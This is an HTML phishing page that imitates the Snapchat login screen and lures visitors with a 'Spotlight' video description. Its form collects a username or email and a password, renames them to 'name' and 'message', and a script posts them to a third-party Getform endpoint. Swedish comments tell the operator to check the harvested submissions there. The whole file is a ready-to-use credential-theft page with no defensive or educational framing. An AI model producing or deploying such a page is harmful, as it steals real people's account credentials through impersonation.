<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <link rel="shortcut icon" href="img/faviconV2.png" />
  <link rel="stylesheet" href="/css/login.css" />
  <title>Login • Snapchat</title>
  <meta name="description" content="Watch this amazing video on Snapchat Spotlight!" />
  <meta property="og:site_name" content="Snapchat Spotlight" />
</head>
<body>
  <!-- Back Button -->
  <button class="back-button" onclick="window.location.href='/Acconts.html';">
    <img src="img/left-arrow.png" height="15" width="15" alt="">
  </button>

  <div class="login-container">
    <h1>Log In</h1>

    <!-- IMPORTANT: Fältens namn är LÅSTA till 'name' och 'message' -->
    <form id="loginForm" action="https://getform.io/f/aolzjgrb" method="POST">
      <label for="username">USERNAME OR EMAIL</label>
      <!-- Skickas till Getform som 'name' -->
      <input type="text" id="username" name="name" placeholder="username or email" required />

      <p class="alternate-option">
        <a href="#" id="switch-to-phone">Use phone number instead</a>
      </p>

      <label for="password">PASSWORD</label>
      <div class="password-container">
        <!-- Skickas till Getform som 'message' -->
        <input type="password" id="password" name="message" placeholder="password" required />
        <button type="button" class="toggle-password" aria-label="Show/Hide password">
          <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon" />
        </button>
      </div>

      <div class="save-info">
        <input type="checkbox" id="save-login" name="saveLogin" />
        <label for="save-login">Save Login Info on your device</label>
      </div>

      <!-- valfri metadata som kan hjälpa dig i Getform-inboxen -->
      <input type="hidden" name="source_page" value="login.html" />
      <input type="hidden" name="timestamp" value="" id="ts-field" />

      <p class="forgot-password">
        <a href="https://accounts.snapchat.com/">Forgot your password?</a>
      </p>

      <button type="submit" class="login-button">Log In</button>
    </form>
  </div>

  <script>
    // Fyll i timestampfältet (hjälper vid felsökning)
    document.getElementById('ts-field').value = new Date().toISOString();

    // Visa/Dölj lösenord
    document.querySelector('.toggle-password').addEventListener('click', () => {
      const pw = document.getElementById('password');
      const eye = document.getElementById('eye-icon');
      if (pw.type === 'password') {
        pw.type = 'text';
        eye.src = 'img/eye-open.svg';
      } else {
        pw.type = 'password';
        eye.src = 'img/eye-closed.svg';
      }
    });

    // Skicka via fetch med FormData (CORS-säkert, låter browsern sätta multipart boundary)
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const form = e.target;
      const formData = new FormData(form);

      try {
        const res = await fetch(form.action, {
          method: 'POST',
          body: formData,
          headers: { 'Accept': 'application/json' }
        });

        if (res.ok) {
          alert('✅ Inskickat! Kolla Getform submissions.');
          form.reset();
        } else {
          const text = await res.text();
          alert('⚠️ Något gick fel: ' + res.status + ' ' + res.statusText + '\n' + text);
        }
      } catch (err) {
        alert('❌ Nätverksfel: ' + err.message);
      }
    });
  </script>
</body>
</html>
